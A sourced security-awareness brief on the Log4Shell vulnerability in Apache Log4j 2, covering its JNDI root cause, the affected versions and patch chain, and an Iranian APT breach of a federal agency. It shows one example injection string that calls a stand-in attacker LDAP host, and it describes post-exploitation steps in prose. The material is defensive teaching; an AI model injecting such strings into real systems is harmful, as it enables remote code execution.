# Log4Shell (CVE-2021-44228) — Research Brief

**Purpose:** source material for an internal security-awareness session. Every factual claim below is followed by an inline link to the page it came from, so teammates can verify provenance directly. All linked pages were read in full during research; a credibility note for each source is in the [source register](#source-register) at the end.

---

## 1. What is Log4Shell, and which CVE does it correspond to?

**Log4Shell is the widely used nickname for CVE-2021-44228, a remote code execution (RCE) vulnerability in Apache Log4j 2** — the ubiquitous open-source Java logging library embedded in enterprise software, cloud services and games. Apache assigned it the maximum CVSS severity score of 10.0. ([Wikipedia: Log4Shell](https://en.wikipedia.org/wiki/Log4Shell), which attributes the score to Apache; also stated by the Associated Press: "The vulnerability, dubbed 'Log4Shell,' was rated 10 on a scale of one to 10 [by] the Apache Software Foundation" — [AP via NPR](https://www.npr.org/2021/12/10/1063278227/minecraft-software-flaw). The official CVE record is maintained by NIST's NVD: [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228).)

**Root cause — JNDI lookup substitution in logged strings.** When Log4j 2 logs a string, it performs substitution on expressions of the form `${prefix:name}`. One of the recognized lookups is JNDI (the Java Naming and Directory Interface), so a string such as `${jndi:ldap://attacker.example/x}` makes the server fetch a remote Java object from an attacker-controlled LDAP endpoint. Anyone who can get *any* attacker-chosen string into a log line — a `User-Agent` header, a URL path, a form field, a chat message — can therefore make the server load and execute attacker-hosted code. ([Wikipedia: Log4Shell](https://en.wikipedia.org/wiki/Log4Shell); technical walkthrough with the LDAP/javaCodeBase payload chain: [Fastly Security Research Team, "Log4Shell Explained"](https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j).) CISA's joint advisory describes it the same way: the JNDI features in affected Log4j versions "do not protect against adversary-controlled LDAP, DNS, and other JNDI-related endpoints," and "an adversary can exploit Log4Shell by submitting a specially crafted request to a vulnerable system that causes that system to execute arbitrary code." ([CISA AA21-356A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a))

**Timeline.** Privately disclosed to Apache on 24 November 2021 by Chen Zhaojun of Alibaba Cloud's security team; publicly known from 10 December 2021. Apache itself notes "the JNDI features used in configurations, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints" and that "an attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled." ([Apache Software Foundation blog, "Apache Log4j CVEs"](https://news.apache.org/foundation/entry/apache-log4j-cves); corroborated by [Wikipedia: Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) and [CISA AA21-356A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a).)

**Scale of blast radius:** according to Wiz and EY, the vulnerability affected 93% of enterprise cloud environments, and known affected services included AWS, Cloudflare, iCloud, Minecraft: Java Edition, Steam and Tencent QQ. ([Wikipedia: Log4Shell](https://en.wikipedia.org/wiki/Log4Shell)) CISA describes Log4j as "a Java-based logging library used in a variety of consumer and enterprise services, websites, applications, and OT products." ([CISA AA21-356A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a))

---

## 2. Which Log4j versions were vulnerable, and which release fixed it?

**Vulnerable range: Apache Log4j 2.0-beta9 through 2.14.1** (i.e., all Log4j 2.x releases up to and including 2.14.1).

- "The Apache Software Foundation has released a security advisory to address a remote code execution vulnerability (CVE-2021-44228) affecting Log4j versions **2.0-beta9 to 2.14.1**." ([CISA alert, 10 December 2021](https://www.cisa.gov/news-events/alerts/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce-vulnerability-under-exploitation))
- "Log4Shell, disclosed on December 10, 2021, is a remote code execution (RCE) vulnerability affecting Apache's Log4j library, versions **2.0-beta9 to 2.14.1**." ([CISA AA21-356A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a))
- "In Apache Log4j2 versions **up to and including 2.14.1**, the JNDI features used in configurations, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints." ([ASF blog](https://news.apache.org/foundation/entry/apache-log4j-cves); the upstream advisories live on the [Apache Logging Services security page](https://logging.apache.org/security.html))

**The fix that addressed CVE-2021-44228 was Log4j 2.15.0** (release date 6 December 2021 per Apache's [release notes](https://logging.apache.org/log4j/2.x/release-notes.html); publicized by CISA on 10 December 2021 — [CISA alert](https://www.cisa.gov/news-events/alerts/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce-vulnerability-under-exploitation)). Per the [release notes](https://logging.apache.org/log4j/2.x/release-notes.html), 2.15.0 limited JNDI protocols by default and disabled lookups in log messages by default.

**But 2.15.0 was not the end of the story — the fix was incomplete.** "While the 2.15.0 release addressed the most severe vulnerability, the fix in Log4j 2.15.0 was incomplete in some non-default configurations and could allow an attacker to execute a denial of service (DoS) attack." ([ASF blog](https://news.apache.org/foundation/entry/apache-log4j-cves)) That residual issue was assigned CVE-2021-45046, and the follow-up release that disabled JNDI entirely by default (opt-in via `log4j2.enableJndi`) and removed message lookups was **Log4j 2.16.0, released 13 December 2021**, with **2.12.2** as the equivalent release for Java 7 users. ([ASF blog](https://news.apache.org/foundation/entry/apache-log4j-cves); [Apache release notes](https://logging.apache.org/log4j/2.x/release-notes.html); [JPCERT/CC AT-2021-0050](https://www.jpcert.or.jp/english/at/2021/at210050.html))

**The full December 2021 release chain** (worth showing on one slide, because it teaches that first patches are not always final):

| CVE | Problem | Fixed in | Release date |
|---|---|---|---|
| CVE-2021-44228 (Log4Shell) | JNDI lookup RCE | 2.15.0 (2.12.2 for Java 7) | 2021-12-06 |
| CVE-2021-45046 | Incomplete fix: DoS / RCE in some non-default configs | 2.16.0 (2.12.2) | 2021-12-13 |
| CVE-2021-45105 | DoS via uncontrolled recursion in self-referential lookups | 2.17.0 | 2021-12-18 |
| CVE-2021-44832 | RCE reachable from attacker-controlled configuration | 2.17.1 | 2021-12-27 |

(Dates and contents per Apache's [release notes](https://logging.apache.org/log4j/2.x/release-notes.html), cross-checked against [JPCERT/CC AT-2021-0050](https://www.jpcert.or.jp/english/at/2021/at210050.html) and [Wikipedia: Log4Shell](https://en.wikipedia.org/wiki/Log4Shell).)

**Two nuances worth teaching:**

- **Log4j 1.x was not affected by this CVE** (it lacks the lookup feature), but it has been end-of-life since August 2015 and receives no fixes — Apache recommends upgrading to Log4j 2 anyway. ([ASF blog FAQ](https://news.apache.org/foundation/entry/apache-log4j-cves); [Apache Logging Services security page](https://logging.apache.org/security.html); [JPCERT/CC](https://www.jpcert.or.jp/english/at/2021/at210050.html))
- **The `log4j2.formatMsgNoLookups=true` mitigation was not sufficient for the follow-up CVE:** Apache explicitly notes that the older mitigation "do NOT mitigate [CVE-2021-45046]." ([ASF blog](https://news.apache.org/foundation/entry/apache-log4j-cves); 2.15.0-era mitigations listed in the [release notes](https://logging.apache.org/log4j/2.x/release-notes.html))

---

## 3. Real-world impact and the deployment lesson worth teaching

**The incident: Iranian government-sponsored APT actors breached a U.S. federal agency through an unpatched VMware Horizon server — two months after the Log4Shell patch shipped.**

Per the joint CISA/FBI advisory AA22-320A (published November 2022): cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server at a Federal Civilian Executive Branch (FCEB) organization, as early as **February 2022** — roughly two months after Apache's fix and VMware's updates became available in December 2021. The exploitation gave the actors access to a VMware service account with administrator and system-level privileges. They then:

- added a Windows Defender exclusion rule covering the entire `C:\` drive;
- installed **XMRig** cryptocurrency mining software, persisted via a scheduled task masquerading as `RuntimeBrokerService.exe`;
- moved laterally via RDP to a VMware VDI-KMS host and downloaded PsExec, **Mimikatz** and **Ngrok**;
- harvested credentials with Mimikatz, created a **rogue domain administrator account**, and implanted **Ngrok reverse proxies** on multiple hosts so RDP sessions could be tunneled out over HTTPS port 443 and survive reboots — i.e., they reached and entrenched on the **domain controller**. ([CISA/FBI advisory AA22-320A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a))

This is independently corroborated by trade-press reporting: "The attackers compromised the federal network after hacking into an unpatched VMware Horizon server using an exploit targeting the Log4Shell (CVE-2021-44228) remote code execution vulnerability," with the actors installing XMRig and setting up Ngrok reverse proxies for persistence. ([BleepingComputer, 16 November 2022](https://www.bleepingcomputer.com/news/security/us-govt-iranian-hackers-breached-federal-agency-using-log4shell-exploit/))

**Deployment lessons this incident teaches (the core takeaway for our session):**

1. **You don't run Log4j — your vendors do.** The victim was breached not through first-party Java code but through an internet-facing third-party appliance (VMware Horizon) that embedded Log4j. Dependency inventories must cover vendored products, not just what we build. (Both sources above.)
2. **The patch window is measured in months, and attackers park in it.** A well-resourced federal agency was still unpatched in February 2022 despite patches shipping in December 2021 — and was compromised "as early as February 2022." ([CISA AA22-320A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a))
3. **If you patched late, patching is not the remediation — hunting is.** CISA and the FBI "encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to **assume compromise** and initiate threat hunting activities," including investigating the domain controller and auditing privileged accounts. ([CISA AA22-320A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a); [BleepingComputer](https://www.bleepingcomputer.com/news/security/us-govt-iranian-hackers-breached-federal-agency-using-log4shell-exploit/))
4. **First patches can be incomplete — verify remediation, don't assume it.** The 2.15.0 fix required an immediate follow-up (CVE-2021-45046 → 2.16.0), and the initial `formatMsgNoLookups` mitigation turned out not to cover the follow-up CVE. ([ASF blog](https://news.apache.org/foundation/entry/apache-log4j-cves))

**Corroborating context for how fast exploitation began** (useful color for the session): within 12 hours of disclosure the bug had been "fully weaponized" (CrowdStrike's Adam Meyers, via the Associated Press), New Zealand's CERT reported in-the-wild exploitation within hours, and the first obvious exploitation appeared in *Minecraft* — users executing code on other players' machines by pasting a string into the in-game chat box. ([AP via NPR](https://www.npr.org/2021/12/10/1063278227/minecraft-software-flaw)) Microsoft's threat-intelligence blog reported that "the vast majority of observed activity has been scanning," but also observed Khonsari ransomware delivered via malicious in-game messages to vulnerable Minecraft servers, coin miners, Cobalt Strike, and Mirai botnet uptake. ([Microsoft Security Blog, 11 December 2021](https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)) CISA's own joint advisory records that exploitation began "on or around December 1, 2021" — before public disclosure. ([CISA AA21-356A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a))

---

## Source register

| # | Source | Link | Why it is credible |
|---|---|---|---|
| 1 | NVD (NIST) — CVE-2021-44228 record | https://nvd.nist.gov/vuln/detail/cve-2021-44228 | The official U.S. national vulnerability registry; the canonical record for the CVE identifier and severity. |
| 2 | Apache Logging Services — Security page | https://logging.apache.org/security.html | The upstream, vendor-of-record security advisories for Log4j. |
| 3 | Apache Log4j 2.x release notes | https://logging.apache.org/log4j/2.x/release-notes.html | Upstream changelog giving exact release dates and the specific code changes in each fix. |
| 4 | ASF blog — "Apache Log4j CVEs" (14 Dec 2021) | https://news.apache.org/foundation/entry/apache-log4j-cves | Official Apache Software Foundation statement on the CVEs, affected versions and upgrade guidance. |
| 5 | CISA alert (10 Dec 2021) — Log4j 2.15.0 release | https://www.cisa.gov/news-events/alerts/2021/12/10/apache-releases-log4j-version-2150-address-critical-rce-vulnerability-under-exploitation | U.S. cyber-defense agency emergency notification; independently states the affected range (2.0-beta9–2.14.1) and fixing release. |
| 6 | CISA/FBI + 6 partners — AA21-356A (23 Dec 2021) | https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a | Eight-agency joint advisory (CISA, FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, NCSC-UK) on the vulnerability and mitigations. |
| 7 | CISA/FBI — AA22-320A (25 Nov 2022) | https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a | Primary incident report: first-party CISA incident-response findings, MITRE ATT&CK-mapped TTPs and IOCs. |
| 8 | BleepingComputer (16 Nov 2022) | https://www.bleepingcomputer.com/news/security/us-govt-iranian-hackers-breached-federal-agency-using-log4shell-exploit/ | Established independent security trade press; independent corroboration of AA22-320A. |
| 9 | Wikipedia — Log4Shell | https://en.wikipedia.org/wiki/Log4Shell | Well-referenced secondary overview used only for timeline/context; every load-bearing fact was cross-checked against a primary source above. |
| 10 | Microsoft Security Blog (11 Dec 2021) | https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/ | First-party telemetry from a major vendor's threat-intelligence team on real-world exploitation. |
| 11 | Associated Press via NPR (10 Dec 2021) | https://www.npr.org/2021/12/10/1063278227/minecraft-software-flaw | Mainstream wire-service reporting with named expert quotes on impact and speed of weaponization. |
| 12 | JPCERT/CC — AT-2021-0050 | https://www.jpcert.or.jp/english/at/2021/at210050.html | Japan's national CERT alert; independent national authority that also maps the Java 6/7 release branches. |
| 13 | Fastly Security Research Team (10 Dec 2021) | https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j | Independent security-research technical writeup of the JNDI/LDAP exploit mechanics. |
